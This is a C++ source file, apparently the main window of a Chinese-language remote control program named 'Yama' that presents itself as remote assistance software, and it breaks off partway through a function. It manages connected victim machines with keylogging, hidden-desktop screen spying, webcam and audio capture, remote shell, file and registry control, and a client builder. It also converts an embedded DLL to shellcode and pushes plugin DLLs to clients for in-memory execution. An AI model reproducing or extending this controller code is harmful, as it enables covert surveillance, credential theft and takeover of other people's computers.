
// 2015RemoteDlg.cpp : 实现文件
//

#include "stdafx.h"
#include "2015Remote.h"
#include "2015RemoteDlg.h"
#include "afxdialogex.h"
#include "SettingDlg.h"
#include "IOCPServer.h"
#include "ScreenSpyDlg.h"
#include "FileManagerDlg.h"
#include "TalkDlg.h"
#include "ShellDlg.h"
#include "SystemDlg.h"
#include "BuildDlg.h"
#include "AudioDlg.h"
#include "RegisterDlg.h"
#include "ServicesDlg.h"
#include "VideoDlg.h"
#include <vector>
#include "KeyBoardDlg.h"
#include "InputDlg.h"
#include "CPasswordDlg.h"
#include "pwd_gen.h"
#include "parse_ip.h"
#include <proxy/ProxyMapDlg.h>
#include "DateVerify.h"
#include <fstream>
#include "common/skCrypter.h"
#include "common/commands.h"
#include "common/md5.h"
#include <algorithm>
#include "HideScreenSpyDlg.h"
#include <sys/MachineDlg.h>
#include "Chat.h"
#include "DecryptDlg.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#endif

#ifndef GET_FILEPATH
#define GET_FILEPATH(dir,file) [](char*d,const char*f){char*p=d;while(*p)++p;while('\\'!=*p&&p!=d)--p;strcpy(p+1,f);return d;}(dir,file)
#endif

#define UM_ICONNOTIFY WM_USER+100
#define TIMER_CHECK 1

typedef struct
{
	const char*   szTitle;     //列表的名称
	int		nWidth;            //列表的宽度
}COLUMNSTRUCT;

const int  g_Column_Count_Online  = ONLINELIST_MAX; // 报表的列数

COLUMNSTRUCT g_Column_Data_Online[g_Column_Count_Online] = 
{
	{"IP",				130	},
	{"端口",			60	},
	{"地理位置",		130	},
	{"计算机名/备注",	150	},
	{"操作系统",		120	},
	{"CPU",				80	},
	{"摄像头",			70	},
	{"PING",			70	},
	{"版本",			90	},
	{"安装时间",        120 },
	{"活动窗口",		140 },
	{"类型",			50 },
};

// 用于应用程序“关于”菜单项的 CAboutDlg 对话框

const int g_Column_Count_Message = 3;   // 列表的个数

COLUMNSTRUCT g_Column_Data_Message[g_Column_Count_Message] = 
{
	{"信息类型",		200	},
	{"时间",			200	},
	{"信息内容",	    490	}
};

int g_Column_Online_Width  = 0;
int g_Column_Message_Width = 0;

CMy2015RemoteDlg*  g_2015RemoteDlg = NULL;

static UINT Indicators[] =
{
	IDR_STATUSBAR_STRING  
};

//////////////////////////////////////////////////////////////////////////

// 保存 unordered_map 到文件
void SaveToFile(const ComputerNoteMap& data, const std::string& filename)
{
	std::ofstream outFile(filename, std::ios::binary);  // 打开文件（以二进制模式）
	if (outFile.is_open()) {
		for (const auto& pair : data) {
			outFile.write(reinterpret_cast<const char*>(&pair.first), sizeof(ClientKey));  // 保存 key
			int valueSize = pair.second.GetLength();
			outFile.write(reinterpret_cast<const char*>(&valueSize), sizeof(int));  // 保存 value 的大小
			outFile.write((char*)&pair.second, valueSize);  // 保存 value 字符串
		}
		outFile.close();
	}
	else {
		Mprintf("Unable to open file '%s' for writing!\n", filename.c_str());
	}
}

// 从文件读取 unordered_map 数据
void LoadFromFile(ComputerNoteMap& data, const std::string& filename)
{
	std::ifstream inFile(filename, std::ios::binary);  // 打开文件（以二进制模式）
	if (inFile.is_open()) {
		while (inFile.peek() != EOF) {
			ClientKey key;
			inFile.read(reinterpret_cast<char*>(&key), sizeof(ClientKey));  // 读取 key

			int valueSize;
			inFile.read(reinterpret_cast<char*>(&valueSize), sizeof(int));  // 读取 value 的大小

			ClientValue value;
			inFile.read((char*)&value, valueSize);  // 读取 value 字符串

			data[key] = value;  // 插入到 map 中
		}
		inFile.close();
	}
	else {
		Mprintf("Unable to open file '%s' for reading!\n", filename.c_str());
	}
}

//////////////////////////////////////////////////////////////////////////

class CAboutDlg : public CDialogEx
{
public:
	CAboutDlg();

	// 对话框数据
	enum { IDD = IDD_ABOUTBOX };

protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV 支持

	// 实现
protected:
	DECLARE_MESSAGE_MAP()
};

CAboutDlg::CAboutDlg() : CDialogEx(CAboutDlg::IDD)
{
}

void CAboutDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
}

BEGIN_MESSAGE_MAP(CAboutDlg, CDialogEx)
END_MESSAGE_MAP()


// CMy2015RemoteDlg 对话框

std::string GetFileName(const char* filepath) {
	const char* slash1 = strrchr(filepath, '/');
	const char* slash2 = strrchr(filepath, '\\');
	const char* slash = slash1 > slash2 ? slash1 : slash2;
	return slash ? slash + 1 : filepath;
}

bool IsDll64Bit(BYTE* dllBase) {
	if (!dllBase) return false;

	auto dos = (IMAGE_DOS_HEADER*)dllBase;
	if (dos->e_magic != IMAGE_DOS_SIGNATURE) {
		Mprintf("Invalid DOS header\n");
		return false;
	}

	auto nt = (IMAGE_NT_HEADERS*)(dllBase + dos->e_lfanew);
	if (nt->Signature != IMAGE_NT_SIGNATURE) {
		Mprintf("Invalid NT header\n");
		return false;
	}

	WORD magic = nt->OptionalHeader.Magic;
	return magic == IMAGE_NT_OPTIONAL_HDR64_MAGIC;
}

// 返回：读取的字节数组指针（需要手动释放）
DllInfo* ReadPluginDll(const std::string& filename) {
	// 打开文件（以二进制模式）
	std::ifstream file(filename, std::ios::binary | std::ios::ate);
	std::string name = GetFileName(filename.c_str());
	if (!file.is_open() || name.length() >= 32) {
		Mprintf("无法打开文件: %s\n", filename.c_str());
		return nullptr;
	}

	// 获取文件大小
	std::streamsize fileSize = file.tellg();
	file.seekg(0, std::ios::beg);

	// 分配缓冲区: CMD + DllExecuteInfo + size
	BYTE* buffer = new BYTE[1 + sizeof(DllExecuteInfo) + fileSize];
	if (!file.read(reinterpret_cast<char*>(buffer + 1 + sizeof(DllExecuteInfo)), fileSize)) {
		Mprintf("读取文件失败: %s\n", filename.c_str());
		delete[] buffer;
		return nullptr;
	}
	if (!IsDll64Bit(buffer + 1 + sizeof(DllExecuteInfo))) {
		Mprintf("不支持32位DLL: %s\n", filename.c_str());
		delete[] buffer;
		return nullptr;
	}

	// 设置输出参数
	auto md5 = CalcMD5FromBytes(buffer + 1 + sizeof(DllExecuteInfo), fileSize);
	DllExecuteInfo info = { MEMORYDLL, fileSize, CALLTYPE_IOCPTHREAD, };
	memcpy(info.Name, name.c_str(), name.length());
	memcpy(info.Md5, md5.c_str(), md5.length());
	buffer[0] = CMD_EXECUTE_DLL;
	memcpy(buffer + 1, &info, sizeof(DllExecuteInfo));
	Buffer* buf = new Buffer(buffer, 1 + sizeof(DllExecuteInfo) + fileSize, 0, md5);
	SAFE_DELETE_ARRAY(buffer);
	return new DllInfo{ name, buf };
}

std::vector<DllInfo*> ReadAllDllFilesWindows(const std::string& dirPath) {
	std::vector<DllInfo*> result;

	std::string searchPath = dirPath + "\\*.dll";
	WIN32_FIND_DATAA findData;
	HANDLE hFind = FindFirstFileA(searchPath.c_str(), &findData);

	if (hFind == INVALID_HANDLE_VALUE) {
		Mprintf("无法打开目录: %s\n", dirPath.c_str());
		return result;
	}

	do {
		if (!(findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
			std::string fullPath = dirPath + "\\" + findData.cFileName;
			DllInfo* dll = ReadPluginDll(fullPath.c_str());
			if (dll) {
				result.push_back(dll);
			}
		}
	} while (FindNextFileA(hFind, &findData));

	FindClose(hFind);
	return result;
}

CMy2015RemoteDlg::CMy2015RemoteDlg(IOCPServer* iocpServer, CWnd* pParent): CDialogEx(CMy2015RemoteDlg::IDD, pParent)
{
	m_iocpServer = iocpServer;
	m_hExit = CreateEvent(NULL, TRUE, FALSE, NULL);
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);

	m_bmOnline[0].LoadBitmap(IDB_BITMAP_ONLINE);
	m_bmOnline[1].LoadBitmap(IDB_BITMAP_UPDATE);
	m_bmOnline[2].LoadBitmap(IDB_BITMAP_DELETE);
	m_bmOnline[3].LoadBitmap(IDB_BITMAP_SHARE);
	m_bmOnline[4].LoadBitmap(IDB_BITMAP_PROXY);
	m_bmOnline[5].LoadBitmap(IDB_BITMAP_HOSTNOTE);
	m_bmOnline[6].LoadBitmap(IDB_BITMAP_VDESKTOP);
	m_bmOnline[7].LoadBitmap(IDB_BITMAP_GDESKTOP);
	m_bmOnline[8].LoadBitmap(IDB_BITMAP_DDESKTOP);
	m_bmOnline[9].LoadBitmap(IDB_BITMAP_SDESKTOP);

	for (int i = 0; i < PAYLOAD_MAXTYPE; i++) {
		m_ServerDLL[i] = nullptr;
		m_ServerBin[i] = nullptr;
	}

	InitializeCriticalSection(&m_cs);

	// Init DLL list
	char path[_MAX_PATH];
	GetModuleFileNameA(NULL, path, _MAX_PATH);
	GET_FILEPATH(path, "Plugins");
	m_DllList = ReadAllDllFilesWindows(path);
}


CMy2015RemoteDlg::~CMy2015RemoteDlg()
{
	DeleteCriticalSection(&m_cs);
	for (int i = 0; i < PAYLOAD_MAXTYPE; i++) {
		SAFE_DELETE(m_ServerDLL[i]);
		SAFE_DELETE(m_ServerBin[i]);
	}
	for (int i = 0; i < m_DllList.size(); i++)
	{
		SAFE_DELETE(m_DllList[i]);
	}
}

void CMy2015RemoteDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_ONLINE, m_CList_Online);
	DDX_Control(pDX, IDC_MESSAGE, m_CList_Message);
}

BEGIN_MESSAGE_MAP(CMy2015RemoteDlg, CDialogEx)
	ON_WM_SYSCOMMAND()
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_WM_SIZE()
	ON_WM_TIMER()
	ON_WM_CLOSE()
	ON_NOTIFY(NM_RCLICK, IDC_ONLINE, &CMy2015RemoteDlg::OnNMRClickOnline)
	ON_NOTIFY(HDN_ITEMCLICK, 0, &CMy2015RemoteDlg::OnHdnItemclickList)
	ON_COMMAND(ID_ONLINE_MESSAGE, &CMy2015RemoteDlg::OnOnlineMessage)
	ON_COMMAND(ID_ONLINE_DELETE, &CMy2015RemoteDlg::OnOnlineDelete)
	ON_COMMAND(ID_ONLINE_UPDATE, &CMy2015RemoteDlg::OnOnlineUpdate)
	ON_COMMAND(IDM_ONLINE_ABOUT,&CMy2015RemoteDlg::OnAbout)

	ON_COMMAND(IDM_ONLINE_CMD, &CMy2015RemoteDlg::OnOnlineCmdManager)
	ON_COMMAND(IDM_ONLINE_PROCESS, &CMy2015RemoteDlg::OnOnlineProcessManager)
	ON_COMMAND(IDM_ONLINE_WINDOW, &CMy2015RemoteDlg::OnOnlineWindowManager)
	ON_COMMAND(IDM_ONLINE_DESKTOP, &CMy2015RemoteDlg::OnOnlineDesktopManager)
	ON_COMMAND(IDM_ONLINE_FILE, &CMy2015RemoteDlg::OnOnlineFileManager)
	ON_COMMAND(IDM_ONLINE_AUDIO, &CMy2015RemoteDlg::OnOnlineAudioManager)
	ON_COMMAND(IDM_ONLINE_VIDEO, &CMy2015RemoteDlg::OnOnlineVideoManager)
	ON_COMMAND(IDM_ONLINE_SERVER, &CMy2015RemoteDlg::OnOnlineServerManager)
	ON_COMMAND(IDM_ONLINE_REGISTER, &CMy2015RemoteDlg::OnOnlineRegisterManager)  
	ON_COMMAND(IDM_KEYBOARD, &CMy2015RemoteDlg::OnOnlineKeyboardManager)
	ON_COMMAND(IDM_ONLINE_BUILD, &CMy2015RemoteDlg::OnOnlineBuildClient)    //生成Client
	ON_MESSAGE(UM_ICONNOTIFY, (LRESULT (__thiscall CWnd::* )(WPARAM,LPARAM))OnIconNotify) 
	ON_COMMAND(IDM_NOTIFY_SHOW, &CMy2015RemoteDlg::OnNotifyShow)
	ON_COMMAND(ID_NOTIFY_EXIT, &CMy2015RemoteDlg::OnNotifyExit)
	ON_COMMAND(ID_MAIN_SET, &CMy2015RemoteDlg::OnMainSet)
	ON_COMMAND(ID_MAIN_EXIT, &CMy2015RemoteDlg::OnMainExit)
	ON_MESSAGE(WM_USERTOONLINELIST, OnUserToOnlineList) 
	ON_MESSAGE(WM_USEROFFLINEMSG, OnUserOfflineMsg)
	ON_MESSAGE(WM_OPENSCREENSPYDIALOG, OnOpenScreenSpyDialog) 
	ON_MESSAGE(WM_OPENFILEMANAGERDIALOG, OnOpenFileManagerDialog)
	ON_MESSAGE(WM_OPENTALKDIALOG, OnOpenTalkDialog)
	ON_MESSAGE(WM_OPENSHELLDIALOG, OnOpenShellDialog)
	ON_MESSAGE(WM_OPENSYSTEMDIALOG, OnOpenSystemDialog)
	ON_MESSAGE(WM_OPENAUDIODIALOG, OnOpenAudioDialog)
	ON_MESSAGE(WM_OPENSERVICESDIALOG, OnOpenServicesDialog)
	ON_MESSAGE(WM_OPENREGISTERDIALOG, OnOpenRegisterDialog)
	ON_MESSAGE(WM_OPENWEBCAMDIALOG, OnOpenVideoDialog)
	ON_MESSAGE(WM_HANDLEMESSAGE, OnHandleMessage)
	ON_MESSAGE(WM_OPENKEYBOARDDIALOG, OnOpenKeyboardDialog)
	ON_MESSAGE(WM_OPENPROXYDIALOG, OnOpenProxyDialog)
	ON_MESSAGE(WM_OPENHIDESCREENDLG, OnOpenHideScreenDialog)
	ON_MESSAGE(WM_OPENMACHINEMGRDLG, OnOpenMachineManagerDialog)
	ON_MESSAGE(WM_OPENCHATDIALOG, OnOpenChatDialog)
	ON_MESSAGE(WM_OPENDECRYPTDIALOG, OnOpenDecryptDialog)
	ON_MESSAGE(WM_UPXTASKRESULT, UPXProcResult)
	ON_WM_HELPINFO()
	ON_COMMAND(ID_ONLINE_SHARE, &CMy2015RemoteDlg::OnOnlineShare)
	ON_COMMAND(ID_TOOL_AUTH, &CMy2015RemoteDlg::OnToolAuth)
	ON_COMMAND(ID_TOOL_GEN_MASTER, &CMy2015RemoteDlg::OnToolGenMaster)
	ON_COMMAND(ID_MAIN_PROXY, &CMy2015RemoteDlg::OnMainProxy)
	ON_COMMAND(ID_ONLINE_HOSTNOTE, &CMy2015RemoteDlg::OnOnlineHostnote)
	ON_COMMAND(ID_HELP_IMPORTANT, &CMy2015RemoteDlg::OnHelpImportant)
	ON_COMMAND(ID_HELP_FEEDBACK, &CMy2015RemoteDlg::OnHelpFeedback)
	// 将所有动态子菜单项的命令 ID 映射到同一个响应函数
	ON_COMMAND_RANGE(ID_DYNAMIC_MENU_BASE, ID_DYNAMIC_MENU_BASE + 20, &CMy2015RemoteDlg::OnDynamicSubMenu)
	ON_COMMAND(ID_ONLINE_VIRTUAL_DESKTOP, &CMy2015RemoteDlg::OnOnlineVirtualDesktop)
	ON_COMMAND(ID_ONLINE_GRAY_DESKTOP, &CMy2015RemoteDlg::OnOnlineGrayDesktop)
	ON_COMMAND(ID_ONLINE_REMOTE_DESKTOP, &CMy2015RemoteDlg::OnOnlineRemoteDesktop)
	ON_COMMAND(ID_ONLINE_H264_DESKTOP, &CMy2015RemoteDlg::OnOnlineH264Desktop)
END_MESSAGE_MAP()


// CMy2015RemoteDlg 消息处理程序
void CMy2015RemoteDlg::OnIconNotify(WPARAM wParam, LPARAM lParam)   
{
	switch ((UINT)lParam)
	{
	case WM_LBUTTONDOWN:
		{
			if (IsIconic())
			{
				ShowWindow(SW_SHOW);
				break;
			}
			ShowWindow(IsWindowVisible() ? SW_HIDE : SW_SHOW);
			SetForegroundWindow();
			break;
		}
	case WM_RBUTTONDOWN:
		{
			CMenu Menu;
			Menu.LoadMenu(IDR_MENU_NOTIFY);
			CPoint Point;
			GetCursorPos(&Point);
			SetForegroundWindow();   //设置当前窗口
			Menu.GetSubMenu(0)->TrackPopupMenu(
				TPM_LEFTBUTTON|TPM_RIGHTBUTTON, 
				Point.x, Point.y, this, NULL); 

			break;
		}
	}
}

VOID CMy2015RemoteDlg::CreateSolidMenu()
{
	m_MainMenu.LoadMenu(IDR_MENU_MAIN);
	CMenu* SubMenu = m_MainMenu.GetSubMenu(1);
	std::string masterHash(skCrypt(MASTER_HASH));
	if (GetPwdHash() != masterHash) {
		SubMenu->DeleteMenu(ID_TOOL_GEN_MASTER, MF_BYCOMMAND);
	}

	::SetMenu(this->GetSafeHwnd(), m_MainMenu.GetSafeHmenu()); //为窗口设置菜单
	::DrawMenuBar(this->GetSafeHwnd());                        //显示菜单
}

VOID CMy2015RemoteDlg::CreatStatusBar()
{
	if (!m_StatusBar.Create(this) ||
		!m_StatusBar.SetIndicators(Indicators,
		sizeof(Indicators)/sizeof(UINT)))                    //创建状态条并设置字符资源的ID
	{
		return ;      
	}

	CRect rect;
	GetWindowRect(&rect);
	rect.bottom+=20;
	MoveWindow(rect);
}

VOID CMy2015RemoteDlg::CreateNotifyBar()
{
	m_Nid.cbSize = sizeof(NOTIFYICONDATA);     //大小赋值
	m_Nid.hWnd = m_hWnd;           //父窗口    是被定义在父类CWnd类中
	m_Nid.uID = IDR_MAINFRAME;     //icon  ID
	m_Nid.uFlags = NIF_MESSAGE | NIF_ICON | NIF_TIP;     //托盘所拥有的状态
	m_Nid.uCallbackMessage = UM_ICONNOTIFY;              //回调消息
	m_Nid.hIcon = m_hIcon;                               //icon 变量
	CString strTips ="禁界: 远程协助软件";       //气泡提示
	lstrcpyn(m_Nid.szTip, (LPCSTR)strTips, sizeof(m_Nid.szTip) / sizeof(m_Nid.szTip[0]));
	Shell_NotifyIcon(NIM_ADD, &m_Nid);   //显示托盘
}

VOID CMy2015RemoteDlg::CreateToolBar()
{
	if (!m_ToolBar.CreateEx(this, TBSTYLE_FLAT, WS_CHILD | WS_VISIBLE | CBRS_TOP
		| CBRS_GRIPPER | CBRS_TOOLTIPS | CBRS_FLYBY | CBRS_SIZE_DYNAMIC) ||
		!m_ToolBar.LoadToolBar(IDR_TOOLBAR_MAIN))  //创建一个工具条  加载资源
	{
		return;     
	}
	m_ToolBar.LoadTrueColorToolBar
		(
		48,    //加载真彩工具条
		IDB_BITMAP_MAIN,
		IDB_BITMAP_MAIN,
		IDB_BITMAP_MAIN
		);  //和我们的位图资源相关联
	RECT Rect,RectMain;
	GetWindowRect(&RectMain);   //得到整个窗口的大小
	Rect.left=0;
	Rect.top=0;
	Rect.bottom=80;
	Rect.right=RectMain.right-RectMain.left+10;
	m_ToolBar.MoveWindow(&Rect,TRUE);

	m_ToolBar.SetButtonText(0,"终端管理");     //在位图的下面添加文件
	m_ToolBar.SetButtonText(1,"进程管理"); 
	m_ToolBar.SetButtonText(2,"窗口管理"); 
	m_ToolBar.SetButtonText(3,"桌面管理"); 
	m_ToolBar.SetButtonText(4,"文件管理"); 
	m_ToolBar.SetButtonText(5,"语音管理"); 
	m_ToolBar.SetButtonText(6,"视频管理"); 
	m_ToolBar.SetButtonText(7,"服务管理"); 
	m_ToolBar.SetButtonText(8,"注册表管理"); 
	m_ToolBar.SetButtonText(9, "键盘记录");
	m_ToolBar.SetButtonText(10,"参数设置"); 
	m_ToolBar.SetButtonText(11,"生成服务端"); 
	m_ToolBar.SetButtonText(12,"帮助"); 
	RepositionBars(AFX_IDW_CONTROLBAR_FIRST,AFX_IDW_CONTROLBAR_LAST,0);  //显示
}


VOID CMy2015RemoteDlg::InitControl()
{
	//专属函数

	CRect rect;
	GetWindowRect(&rect);
	rect.bottom+=20;
	MoveWindow(rect);
	auto style = LVS_EX_FULLROWSELECT | LVS_EX_GRIDLINES | LVS_EX_DOUBLEBUFFER | LVS_EX_HEADERDRAGDROP | LVS_EX_LABELTIP;
	for (int i = 0;i<g_Column_Count_Online;++i)
	{
		m_CList_Online.InsertColumn(i, g_Column_Data_Online[i].szTitle,LVCFMT_CENTER,g_Column_Data_Online[i].nWidth);

		g_Column_Online_Width+=g_Column_Data_Online[i].nWidth; 
	}
	m_CList_Online.SetExtendedStyle(style);

	for (int i = 0; i < g_Column_Count_Message; ++i)
	{
		m_CList_Message.InsertColumn(i, g_Column_Data_Message[i].szTitle,LVCFMT_CENTER,g_Column_Data_Message[i].nWidth);
		g_Column_Message_Width+=g_Column_Data_Message[i].nWidth;  
	}

	m_CList_Message.SetExtendedStyle(style);
}


VOID CMy2015RemoteDlg::TestOnline()
{
	ShowMessage(true,"软件初始化成功...");
}

bool IsExitItem(CListCtrl &list, DWORD_PTR data){
	for (int i=0,n=list.GetItemCount();i<n;i++)
	{
		DWORD_PTR v = list.GetItemData(i);
		if (v == data) {
			return true;
		}
	}
	return false;
}

std::vector<CString> SplitCString(CString strData) {
	std::vector<CString> vecItems;
	CString strItem;
	int i = 0;

	while (AfxExtractSubString(strItem, strData, i, _T('|')))
	{
		vecItems.push_back(strItem);  // Add to vector
		i++;
	}
	return vecItems;
}


VOID CMy2015RemoteDlg::AddList(CString strIP, CString strAddr, CString strPCName, CString strOS, 
							   CString strCPU, CString strVideo, CString strPing, CString ver, 
	CString startTime, const std::vector<std::string>& v, CONTEXT_OBJECT * ContextObject)
{
	EnterCriticalSection(&m_cs);
	if (IsExitItem(m_CList_Online, (ULONG_PTR)ContextObject)) {
		LeaveCriticalSection(&m_cs);
		OutputDebugStringA(CString("===> '") + strIP + CString("' already exist!!\n"));
		return;
	}
	LeaveCriticalSection(&m_cs);

	CString install = v[6].empty() ? "?" : v[6].c_str(), path = v[4].empty() ? "?" : v[4].c_str();
	CString data[ONLINELIST_MAX] = { strIP, strAddr, "", strPCName, strOS, strCPU, strVideo, strPing, 
		ver, install, startTime, v[0].empty() ? "?" : v[0].c_str(), path };
	auto id = CONTEXT_OBJECT::CalculateID(data);
	bool modify = false;
	CString loc = GetClientMapData(id, MAP_LOCATION);
	if (loc.IsEmpty()) {
		loc = GetGeoLocation(data[ONLINELIST_IP].GetString()).c_str();
		if (!loc.IsEmpty()) {
			modify = true;
			SetClientMapData(id, MAP_LOCATION, loc);
		}
	}
	data[ONLINELIST_LOCATION] = loc;
	ContextObject->SetClientInfo(data);
	ContextObject->SetID(id);

	EnterCriticalSection(&m_cs);
	if (modify)
		SaveToFile(m_ClientMap, DB_FILENAME);
	auto& m = m_ClientMap[ContextObject->ID];
	int i = m_CList_Online.InsertItem(m_CList_Online.GetItemCount(), strIP);
	for (int n = ONLINELIST_ADDR; n <= ONLINELIST_CLIENTTYPE; n++) {
		n == ONLINELIST_COMPUTER_NAME ? 
			m_CList_Online.SetItemText(i, n, m.GetNote()[0] ? m.GetNote() : data[n]) :
			m_CList_Online.SetItemText(i, n, data[n].IsEmpty() ? "?" : data[n]);
	}
	m_CList_Online.SetItemData(i,(DWORD_PTR)ContextObject);

	ShowMessage(true,strIP+"主机上线");
	LeaveCriticalSection(&m_cs);

	SendMasterSettings(ContextObject);
}


VOID CMy2015RemoteDlg::ShowMessage(BOOL bOk, CString strMsg)
{
	CTime Timer = CTime::GetCurrentTime();
	CString strTime= Timer.Format("%H:%M:%S");
	CString strIsOK= bOk ? "执行成功" : "执行失败";
	
	m_CList_Message.InsertItem(0,strIsOK);    //向控件中设置数据
	m_CList_Message.SetItemText(0,1,strTime);
	m_CList_Message.SetItemText(0,2,strMsg);

	CString strStatusMsg;

	EnterCriticalSection(&m_cs);
	int m_iCount = m_CList_Online.GetItemCount();
	LeaveCriticalSection(&m_cs);

	strStatusMsg.Format("有%d个主机在线",m_iCount);
	m_StatusBar.SetPaneText(0,strStatusMsg);   //在状态条上显示文字
}

extern "C" BOOL ConvertToShellcode(LPVOID inBytes, DWORD length, DWORD userFunction, 
	LPVOID userData, DWORD userLength, DWORD flags, LPSTR * outBytes, DWORD * outLength);

bool MakeShellcode(LPBYTE& compressedBuffer, int& ulTotalSize, LPBYTE originBuffer, int ulOriginalLength) {
	if (originBuffer[0] == 'M' && originBuffer[1] == 'Z') {
		LPSTR finalShellcode = NULL;
		DWORD finalSize;
		if (!ConvertToShellcode(originBuffer, ulOriginalLength, NULL, NULL, 0, 0x1, &finalShellcode, &finalSize)) {
			return false;
		}
		compressedBuffer = new BYTE[finalSize];
		ulTotalSize = finalSize;

		memcpy(compressedBuffer, finalShellcode, finalSize);
		free(finalShellcode);

		return true;
	}
	return false;
}

Buffer* ReadKernelDll(bool is64Bit, bool isDLL=true) {
	BYTE* szBuffer = NULL;
	int dwFileSize = 0;

	// 查找名为 MY_BINARY_FILE 的 BINARY 类型资源
	auto id = is64Bit ? IDR_SERVERDLL_X64 : IDR_SERVERDLL_X86;
	HRSRC hResource = FindResourceA(NULL, MAKEINTRESOURCE(id), "BINARY");
	if (hResource == NULL) {
		return NULL;
	}
	// 获取资源的大小
	DWORD dwSize = SizeofResource(NULL, hResource);

	// 加载资源
	HGLOBAL hLoadedResource = LoadResource(NULL, hResource);
	if (hLoadedResource == NULL) {
		return NULL;
	}
	// 锁定资源并获取指向资源数据的指针
	LPVOID pData = LockResource(hLoadedResource);
	if (pData == NULL) {
		return NULL;
	}
	LPBYTE srcData = (LPBYTE)pData;
	int srcLen = dwSize;
	if (!isDLL) { // Convert DLL -> Shell code.
		if (!MakeShellcode(srcData, srcLen, (LPBYTE)pData, dwSize)) {
			Mprintf("MakeShellcode failed \n");
			return false;
		}
	}
	dwFileSize = srcLen;
	int bufSize = sizeof(int) + dwFileSize + 2;
	int padding = ALIGN16(bufSize) - bufSize;
	szBuffer = new BYTE[bufSize + padding];
	szBuffer[0] = CMD_DLLDATA;
	szBuffer[1] = isDLL ? MEMORYDLL : SHELLCODE;
	memcpy(szBuffer + 2, &dwFileSize, sizeof(int));
	memcpy(szBuffer + 2 + sizeof(int), srcData, dwFileSize);
	memset(szBuffer + 2 + sizeof(int) + dwFileSize, 0, padding);
	// CMD_DLLDATA + SHELLCODE + dwFileSize + pData
	auto md5 = CalcMD5FromBytes(szBuffer + 2 + sizeof(int), dwFileSize);
	auto ret = new Buffer(szBuffer, bufSize + padding, padding, md5);
	delete[] szBuffer;
	if (srcData != pData) 
		SAFE_DELETE_ARRAY(srcData);
	return ret;
}

BOOL CMy2015RemoteDlg::OnInitDialog()
{
	CDialogEx::OnInitDialog();

	if (!IsPwdHashValid()) {
		MessageBox("此程序为非法的应用程序，无法正常运行!", "错误", MB_ICONERROR);
		OnMainExit();
		return FALSE;
	}
	// 将“关于...”菜单项添加到系统菜单中。
	SetWindowText(_T("Yama"));
	LoadFromFile(m_ClientMap, DB_FILENAME);

	// IDM_ABOUTBOX 必须在系统命令范围内。
	ASSERT((IDM_ABOUTBOX & 0xFFF0) == IDM_ABOUTBOX);
	ASSERT(IDM_ABOUTBOX < 0xF000);

	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu != NULL)
	{
		BOOL bNameValid;
		CString strAboutMenu;
		bNameValid = strAboutMenu.LoadString(IDS_ABOUTBOX);
		ASSERT(bNameValid);
		if (!strAboutMenu.IsEmpty())
		{
			pSysMenu->AppendMenu(MF_SEPARATOR);
			pSysMenu->AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu);
		}
	}
	m_ServerDLL[PAYLOAD_DLL_X86] = ReadKernelDll(false);
	m_ServerDLL[PAYLOAD_DLL_X64] = ReadKernelDll(true);
	m_ServerBin[PAYLOAD_DLL_X86] = ReadKernelDll(false, false);
	m_ServerBin[PAYLOAD_DLL_X64] = ReadKernelDll(true, false);

	// 设置此对话框的图标。当应用程序主窗口不是对话框时，框架将自动
	//  执行此操作
	SetIcon(m_hIcon, TRUE);			// 设置大图标
	SetIcon(m_hIcon, FALSE);		// 设置小图标

	// TODO: 在此添加额外的初始化代码
	isClosed = FALSE;
	g_2015RemoteDlg = this;
	CreateToolBar();
	InitControl();

	CreatStatusBar();

	CreateNotifyBar();

	CreateSolidMenu();

	if (!ListenPort()) {
		OnCancel();
		return FALSE;
	}
	int m = atoi(((CMy2015RemoteApp*)AfxGetApp())->m_iniFile.GetStr("settings", "ReportInterval", "5"));
	int n = ((CMy2015RemoteApp*)AfxGetApp())->m_iniFile.GetInt("settings", "SoftwareDetect");
	m_settings = { m, sizeof(void*) == 8, __DATE__, n };
	std::map<int, std::string> myMap = {{SOFTWARE_CAMERA, "摄像头"}, {SOFTWARE_TELEGRAM, "电报" }};
	std::string str = myMap[n];
	LVCOLUMN lvColumn;
	memset(&lvColumn, 0, sizeof(LVCOLUMN));
	lvColumn.mask = LVCF_TEXT;
	lvColumn.pszText = (char*)str.data();
	m_CList_Online.SetColumn(ONLINELIST_VIDEO, &lvColumn);
	timeBeginPeriod(1);
#ifdef _DEBUG
	SetTimer(TIMER_CHECK, 60 * 1000, NULL);
#else
	SetTimer(TIMER_CHECK, 600 * 1000, NULL);
#endif

	return TRUE;  // 除非将焦点设置到控件，否则返回 TRUE
}

void CMy2015RemoteDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	if ((nID & 0xFFF0) == IDM_ABOUTBOX)
	{
		CAboutDlg dlgAbout;
		dlgAbout.DoModal();
	}
	else
	{
		CDialogEx::OnSysCommand(nID, lParam);
	}
}

// 如果向对话框添加最小化按钮，则需要下面的代码
//  来绘制该图标。对于使用文档/视图模型的 MFC 应用程序，
//  这将由框架自动完成。

void CMy2015RemoteDlg::OnPaint()
{
	if (IsIconic())
	{
		CPaintDC dc(this); // 用于绘制的设备上下文

		SendMessage(WM_ICONERASEBKGND, reinterpret_cast<WPARAM>(dc.GetSafeHdc()), 0);

		// 使图标在工作区矩形中居中
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// 绘制图标
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialogEx::OnPaint();
	}
}

//当用户拖动最小化窗口时系统调用此函数取得光标
//显示。
HCURSOR CMy2015RemoteDlg::OnQueryDragIcon()
{
	return static_cast<HCURSOR>(m_hIcon);
}

void CMy2015RemoteDlg::OnSize(UINT nType, int cx, int cy)
{
	CDialogEx::OnSize(nType, cx, cy);

	// TODO: 在此处添加消息处理程序代码
	if (SIZE_MINIMIZED==nType)
	{
		return;
	} 
